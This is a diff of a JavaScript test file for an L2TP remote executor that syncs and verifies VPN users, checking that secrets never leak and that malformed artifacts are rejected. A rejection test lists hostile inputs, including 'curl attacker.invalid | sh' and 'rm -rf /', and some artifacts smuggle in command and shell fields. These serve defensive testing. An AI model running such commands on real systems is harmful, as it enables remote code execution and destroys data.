@@ -149,8 +149,313 @@ test('maps every install-plan step to its same-name allowlisted command', async 
         transport.calls
             .filter(call => call.method === 'runArtifactCommand')
             .map(call => call.request.command),
-        INSTALL_STEP_TYPES,
+        INSTALL_STEP_TYPES.map(type => type === 'sync_users' ? 'sync-users' : type),
     );
+});
+
+test('standalone sync_users uploads exact transient desired users then syncs and verifies', async () => {
+    const calls = [];
+    const secret = 'standalone-sync-secret-canary';
+    const content = JSON.stringify({
+        credentialRevision: 42,
+        users: [
+            { login: 'alpha', password: secret, ipAddress: '10.77.0.10', enabled: true },
+            { login: 'disabled-user', password: 'disabled-secret', ipAddress: '10.77.0.11', enabled: false },
+        ],
+    });
+    const verifierResult = {
+        ok: true,
+        credentialRevision: 42,
+        enabledUserCount: 1,
+        managedUserCount: 1,
+        code: 'USERS_VERIFIED',
+    };
+    const transport = {
+        async uploadRootFile(request) {
+            calls.push({ method: 'uploadRootFile', request });
+        },
+        async runArtifactCommand(request) {
+            calls.push({ method: 'runArtifactCommand', request });
+            return request.command === 'verify-users' ? verifierResult : { ok: true };
+        },
+    };
+    const executor = new L2tpRemoteExecutor({ transport });
+
+    const result = await executor.executeStep({
+        operation: {
+            id: 'operation-standalone-users',
+            kind: 'sync_users',
+            plan: { desired: { credentialRevision: 42 } },
+        },
+        step: {
+            type: 'sync_users',
+            artifacts: [{ type: 'desired', path: 'desired.json', content }],
+        },
+    });
+
+    assert.deepEqual(calls, [
+        {
+            method: 'uploadRootFile',
+            request: {
+                operationId: 'operation-standalone-users',
+                type: 'desired',
+                path: 'desired.json',
+                content,
+                owner: 'root',
+                group: 'root',
+                mode: 0o600,
+            },
+        },
+        {
+            method: 'runArtifactCommand',
+            request: { operationId: 'operation-standalone-users', command: 'sync-users' },
+        },
+        {
+            method: 'runArtifactCommand',
+            request: {
+                operationId: 'operation-standalone-users',
+                command: 'verify-users',
+                expectedCredentialRevision: 42,
+                expectedEnabledUserCount: 1,
+            },
+        },
+    ]);
+    assert.deepEqual(result, verifierResult);
+    assert.doesNotMatch(JSON.stringify({ result, commands: calls.slice(1) }), new RegExp(secret));
+});
+
+test('verify_users maps to the fixed verifier command with the cached typed expectation', async () => {
+    const calls = [];
+    const content = JSON.stringify({
+        credentialRevision: 42,
+        users: [{
+            login: 'alpha', password: 'verify-step-secret', ipAddress: '10.77.0.10', enabled: true,
+        }],
+    });
+    const verifierResult = {
+        ok: true,
+        credentialRevision: 42,
+        enabledUserCount: 1,
+        managedUserCount: 1,
+        code: 'USERS_VERIFIED',
+    };
+    const transport = {
+        async uploadRootFile(request) {
+            calls.push({ method: 'uploadRootFile', request });
+        },
+        async runArtifactCommand(request) {
+            calls.push({ method: 'runArtifactCommand', request });
+            return request.command === 'verify-users' ? verifierResult : { ok: true };
+        },
+    };
+    const executor = new L2tpRemoteExecutor({ transport });
+    const operation = {
+        id: 'operation-explicit-user-verify',
+        kind: 'sync_users',
+        plan: { desired: { credentialRevision: 42 } },
+    };
+
+    await executor.executeStep({
+        operation,
+        step: {
+            type: 'sync_users',
+            artifacts: [{ type: 'desired', path: 'desired.json', content }],
+        },
+    });
+    calls.length = 0;
+    const result = await executor.executeStep({ operation, step: { type: 'verify_users' } });
+
+    assert.deepEqual(calls, [{
+        method: 'runArtifactCommand',
+        request: {
+            operationId: 'operation-explicit-user-verify',
+            command: 'verify-users',
+            expectedCredentialRevision: 42,
+            expectedEnabledUserCount: 1,
+        },
+    }]);
+    assert.deepEqual(result, verifierResult);
+    assert.doesNotMatch(JSON.stringify({ calls, result }), /verify-step-secret/);
+});
+
+test('standalone sync_users returns a strict sanitized mismatch attestation', async () => {
+    const mismatch = {
+        ok: false,
+        credentialRevision: 42,
+        enabledUserCount: 1,
+        managedUserCount: 2,
+        code: 'MANAGED_USERS_EXTRA',
+    };
+    const executor = new L2tpRemoteExecutor({
+        transport: {
+            async uploadRootFile() {},
+            async runArtifactCommand({ command }) {
+                return command === 'verify-users' ? mismatch : { ok: true };
+            },
+        },
+    });
+
+    const result = await executor.executeStep({
+        operation: {
+            id: 'operation-user-mismatch',
+            kind: 'sync_users',
+            plan: { desired: { credentialRevision: 42 } },
+        },
+        step: {
+            type: 'sync_users',
+            artifacts: [{
+                type: 'desired',
+                path: 'desired.json',
+                content: JSON.stringify({
+                    credentialRevision: 42,
+                    users: [{
+                        login: 'alpha', password: 'mismatch-secret', ipAddress: '10.77.0.10', enabled: true,
+                    }],
+                }),
+            }],
+        },
+    });
+
+    assert.deepEqual(result, mismatch);
+    assert.doesNotMatch(JSON.stringify(result), /mismatch-secret/);
+});
+
+test('standalone sync_users rejects missing, foreign, malformed, and wrong-revision artifacts', async () => {
+    const validUser = {
+        login: 'alpha', password: 'artifact-secret-canary', ipAddress: '10.77.0.10', enabled: true,
+    };
+    const invalidSteps = [
+        { type: 'sync_users' },
+        { type: 'sync_users', artifacts: [] },
+        {
+            type: 'sync_users',
+            artifacts: [{ type: 'artifact', path: 'artifacts.json', content: '{}' }],
+        },
+        {
+            type: 'sync_users',
+            artifacts: [{ type: 'desired', path: 'foreign.json', content: '{}' }],
+        },
+        {
+            type: 'sync_users',
+            artifacts: [{ type: 'desired', path: 'desired.json', content: '{not-json}' }],
+        },
+        {
+            type: 'sync_users',
+            artifacts: [{
+                type: 'desired',
+                path: 'desired.json',
+                content: JSON.stringify({ credentialRevision: 41, users: [validUser] }),
+            }],
+        },
+        {
+            type: 'sync_users',
+            artifacts: [{
+                type: 'desired',
+                path: 'desired.json',
+                content: JSON.stringify({ credentialRevision: 42, users: [validUser], command: 'id' }),
+            }],
+        },
+        {
+            type: 'sync_users',
+            artifacts: [{
+                type: 'desired',
+                path: 'desired.json',
+                content: JSON.stringify({
+                    credentialRevision: 42,
+                    users: [{ ...validUser, shell: '/bin/sh' }],
+                }),
+            }],
+        },
+        {
+            type: 'sync_users',
+            artifacts: [{
+                type: 'desired',
+                path: 'desired.json',
+                content: JSON.stringify({
+                    credentialRevision: 42,
+                    users: [{ ...validUser, enabled: 1 }],
+                }),
+            }],
+        },
+    ];
+
+    for (const step of invalidSteps) {
+        const transport = createTransport();
+        const executor = new L2tpRemoteExecutor({ transport });
+        await assert.rejects(
+            executor.executeStep({
+                operation: {
+                    id: 'operation-invalid-users',
+                    kind: 'sync_users',
+                    plan: { desired: { credentialRevision: 42 } },
+                },
+                step,
+            }),
+            error => {
+                assert.equal(error.name, 'L2tpRemoteExecutorError');
+                assert.match(error.code, /^(ARTIFACT_|DESIRED_USERS_|CREDENTIAL_REVISION_)/);
+                assert.doesNotMatch(JSON.stringify(error), /artifact-secret-canary|foreign\.json|not-json|\bid\b/);
+                return true;
+            },
+        );
+        assert.deepEqual(transport.calls, []);
+    }
+});
+
+test('standalone sync_users rejects untrusted verifier results without leaking them', async () => {
+    const secret = 'untrusted-verifier-secret-canary';
+    const desiredContent = JSON.stringify({
+        credentialRevision: 42,
+        users: [{ login: 'alpha', password: secret, ipAddress: '10.77.0.10', enabled: true }],
+    });
+    const base = {
+        ok: true,
+        credentialRevision: 42,
+        enabledUserCount: 1,
+        managedUserCount: 1,
+        code: 'USERS_VERIFIED',
+    };
+    const invalidResults = [
+        secret,
+        { ...base, credentialRevision: 41 },
+        { ...base, enabledUserCount: 2, managedUserCount: 2 },
+        { ...base, code: 'FOREIGN_RESULT' },
+        { ...base, raw: secret },
+        { ...base, ok: 1 },
+        { ...base, managedUserCount: '1' },
+        { ...base, managedUserCount: 1.5 },
+        { ...base, code: { secret } },
+    ];
+
+    for (const invalidResult of invalidResults) {
+        const transport = {
+            async uploadRootFile() {},
+            async runArtifactCommand({ command }) {
+                return command === 'verify-users' ? invalidResult : { ok: true };
+            },
+        };
+        const executor = new L2tpRemoteExecutor({ transport });
+        await assert.rejects(
+            executor.executeStep({
+                operation: {
+                    id: 'operation-untrusted-verifier',
+                    kind: 'sync_users',
+                    plan: { desired: { credentialRevision: 42 } },
+                },
+                step: {
+                    type: 'sync_users',
+                    artifacts: [{ type: 'desired', path: 'desired.json', content: desiredContent }],
+                },
+            }),
+            error => {
+                assert.equal(error.name, 'L2tpRemoteExecutorError');
+                assert.equal(error.code, 'USER_VERIFICATION_INVALID');
+                assert.equal(error.message, 'Invalid L2TP user verification result');
+                assert.doesNotMatch(JSON.stringify(error), new RegExp(secret));
+                return true;
+            },
+        );
+    }
 });
 
 test('requires exactly one materialized typed artifact only on its three declared steps', async () => {
@@ -341,6 +646,11 @@ test('rejects caller-supplied raw commands and argv even for an allowed step', a
     const rawInputs = [
         { command: 'curl attacker.invalid | sh' },
         { argv: ['--password', 'ui-secret'] },
+        { args: ['--password', 'args-secret'] },
+        { arguments: ['--password', 'arguments-secret'] },
+        { stdin: 'stdin-secret' },
+        { env: { PASSWORD: 'env-secret' } },
+        { cwd: '/tmp/raw-command' },
         { shell: 'rm -rf /' },
     ];
 
